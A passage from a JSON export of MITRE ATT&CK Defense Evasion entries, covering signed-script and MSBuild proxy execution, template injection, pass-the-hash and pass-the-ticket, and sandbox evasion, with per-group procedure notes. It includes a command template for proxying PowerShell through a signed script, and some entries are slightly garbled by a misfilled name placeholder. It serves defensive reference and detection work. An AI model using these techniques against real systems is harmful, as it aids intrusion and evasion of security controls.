                "description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).[1] For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.[2][3]The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from \\System32 through the command line via wscript.exe.[4][5]Adversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\"[6][4] Proxying execution may function as a trusted/signed alternative to directly invoking powershell.exe.[7]For example,  PowerShell commands may be invoked using:[5]SyncAppvPublishingServer.vbs \"n; {PowerShell}\"",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.[1] This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[2]",
        "Procedure": {}
    },
    "T1221": {
        "ttp_name": "Template Injection",
        "ttp_id": "T1221",
        "href": "/techniques/T1221",
        "tactic": "Defense Evasion",
        "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.[1]Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.[2] These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.[3] Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.[4]Adversaries may also modify the *\\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.[5][6]This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.[7][8][9]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. [10]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.[11]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has used a weaponized Microsoft Word document with an embedded RTF exploit.[12]"
            },
            "G0079": {
                "ID": "G0079",
                "Name": "DarkHydrus",
                "Description": "malware used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.[13]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.[14]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.[15]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads.[5] malware can also inject malicious macros or remote templates into documents already present on compromised systems.[16][17][18][19][20][21]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has used decoy documents to load malicious remote payloads via HTTP.[22]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.[23][24]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.[25]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.[12]"
            }
        }
    },
    "T1127": {
        "ttp_name": "Trusted Developer Utilities Proxy Execution",
        "ttp_id": "T1127",
        "href": "/techniques/T1127",
        "subtechnique": {
            "001": {
                "name": "MSBuild",
                "href": "/techniques/T1127/001",
                "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.[1]Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.[1][2] MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.[3]",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use built-in modules to abuse trusted utilities like MSBuild.exe.[4]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used MSbuild to execute an actor-created file.[5]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "A version of <name> loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.[6]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.[1][2][3][4] These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",
        "Procedure": {}
    },
    "T1535": {
        "ttp_name": "Unused/Unsupported Cloud Regions",
        "ttp_id": "T1535",
        "href": "/techniques/T1535",
        "tactic": "Defense Evasion",
        "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.[1]",
        "Procedure": {}
    },
    "T1550": {
        "ttp_name": "Use Alternate Authentication Material",
        "ttp_id": "T1550",
        "href": "/techniques/T1550",
        "subtechnique": {
            "001": {
                "name": "Application Access Token",
                "href": "/techniques/T1550/001",
                "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).[1] OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.[2]For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.[3] With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.[4]Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.[5][6] The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.[7]Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the sts:GetFederationToken API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.[8] Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.[9]"
                    },
                    "S1023": {
                        "ID": "S1023",
                        "Name": "CreepyDrive",
                        "Description": "<name> can use legitimate OAuth refresh tokens to authenticate with OneDrive.[10]"
                    },
                    "S0683": {
                        "ID": "S0683",
                        "Name": "Peirates",
                        "Description": "<name> can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.[11]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used compromised service principals to make changes to the Office 365 environment.[12]"
                    }
                }
            },
            "002": {
                "name": "Pass the Hash",
                "href": "/techniques/T1550/002",
                "description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.[1]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "The <name> group is known to have used pass the hash.[2]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used pass the hash for lateral movement.[3]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used pass the hash for lateral movement.[4]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> uses tools such as Mimikatz to enable lateral movement via captured password hashes.[5]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can perform pass the hash on compromised machines with x64 versions.[6]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has dumped password hashes for use in pass the hash authentication attacks.[7]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can perform pass the hash.[8]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can pass the hash to authenticate via SMB.[9]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can perform pass the hash attacks.[10]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used the PowerShell utility Invoke-SMBExec to execute the pass the hash method for lateral movement within an compromised environment.[11]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used dumped hashes to authenticate to other machines via pass the hash.[12]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> has been observed loading several APIs associated with Pass the Hash.[13]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used pass the hash for authentication to remote access software used in C2.[14]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>'s SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.[15][16][17]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.[18]"
                    },
                    "S0122": {
                        "ID": "S0122",
                        "Name": "Pass-The-Hash Toolkit",
                        "Description": "<name> can perform pass the hash.[2]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> has a number of modules that leverage pass the hash for lateral movement.[19]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.[20]"
                    }
                }
            },
            "003": {
                "name": "Pass the Ticket",
                "href": "/techniques/T1550/003",
                "description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.[1][2]A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).[1]A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.[3]Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.[4]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> used Kerberos ticket attacks for lateral movement.[5]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> successfully gained remote access by using pass the ticket.[6]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.[7]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>\u2019s LSADUMP::DCSync and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.[8][9][10][11]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can also perform pass-the-ticket.[12]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "Some <name> samples have a module to use pass the ticket with Kerberos for authentication.[13]"
                    }
                }
            },
            "004": {
                "name": "Web Session Cookie",
                "href": "/techniques/T1550/004",
                "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.[1]Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.[2]",
                "Procedure": {
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account.[3][4]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
        "Procedure": {
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can allow abuse of a compromised AD FS server's SAML token.[3]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.[4][5]"
            }
        }
    },
    "T1497": {
        "ttp_name": "Virtualization/Sandbox Evasion",
        "ttp_id": "T1497",
        "href": "/techniques/T1497",
        "subtechnique": {
            "001": {
                "name": "System Checks",
                "href": "/techniques/T1497/001",
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.[1]Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as malware, sample, or hash.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.[2] In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.[3]",
                "Procedure": {
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.[4]"
                    },
                    "S1087": {
                        "ID": "S1087",
                        "Name": "AsyncRAT",
                        "Description": "<name> can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.[5]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.[6]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. [7]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing.[8][9]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can check to see if the infected machine has VM tools running.[10]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.[11]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.[12]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.[13]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.[14][15]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie.[16]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.[17]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> can detect sandbox analysis environments by inspecting the process list and Registry.[18][19]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name>'s dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.[20]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. [21]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.[22]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.[23]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.[24]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a.[25][26]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can detect VMWare via its I/O port and Virtual PC via the vpcext instruction.[27]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment. [28]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent.[29]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.[30]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.[31]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> can parse the output of the native system_profiler tool to determine if the machine is running with 4 cores.[32]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> has checked the number of CPUs in the system to avoid being run in a sandbox or emulator.[33]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is \"JOHN-PC.\"[34][35]"
                    },
                    "S0637": {
                        "ID": "S0637",
                        "Name": "NativeZone",
                        "Description": "<name> has checked if Vmware or VirtualBox VM is running on a compromised host.[36]"
                    },
                    "S0644": {
                        "ID": "S0644",
                        "Name": "ObliqueRAT",
                        "Description": "<name> can halt execution if it identifies processes belonging to virtual machine software or analysis tools.[37]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used macros to verify if a mouse is connected to a compromised machine.[38]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.[39]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if it\u2019s running in a virtual environment.[3]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.[40]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as sysctl hw.model and the kernel boot time.[41][42][43]"
                    },
                    "S0626": {
                        "ID": "S0626",
                        "Name": "P8RAT",
                        "Description": "<name> can check the compromised host for processes associated with VMware or VirtualBox environments.[44]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\".[45]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting.[46]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> has a module that checks a number of indicators on the system to determine if its running on a virtual machine.[47]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.[48][49]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> searches for Sandboxie and VMware on the system.[50]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. [51][52]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can check for VMware-related files and DLLs related to sandboxes.[53][54][55]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has run several virtual machine and sandbox checks, including checking if Sbiedll.dll is present in a list of loaded modules, comparing the machine name to HAL9TH and the user name to JohnDoe, and checking the BIOS version for known virtual machine identifiers.[56]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> can stop execution if the screen width of the targeted machine is not over 600 pixels.[57]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> scans processes to perform anti-VM checks. [58]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying Win32_ComputerSystem to extract the Manufacturer string.[59]"
                    },
                    "S0627": {
                        "ID": "S0627",
                        "Name": "SodaMaster",
                        "Description": "<name> can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.[44]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> checked the domain name of the compromised host to verify it was running in a real environment.[60]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has the ability to determine if its runtime environment is virtualized.[61]"
                    },
                    "S0242": {
                        "ID": "S0242",
                        "Name": "SynAck",
                        "Description": "<name> checks its directory location in an attempt to avoid launching in a sandbox.[62][63]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.[64]"
                    },
                    "S0333": {
                        "ID": "S0333",
                        "Name": "UBoatRAT",
                        "Description": "<name> checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.[65]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has run system checks to determine if they were operating in a virtualized environment.[66]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.[67]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can stop its execution when it recognizes the presence of certain monitoring tools.[68]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. [69]"
                    }
                }
            },
            "002": {
                "name": "User Activity Based Checks",
                "href": "/techniques/T1497/002",
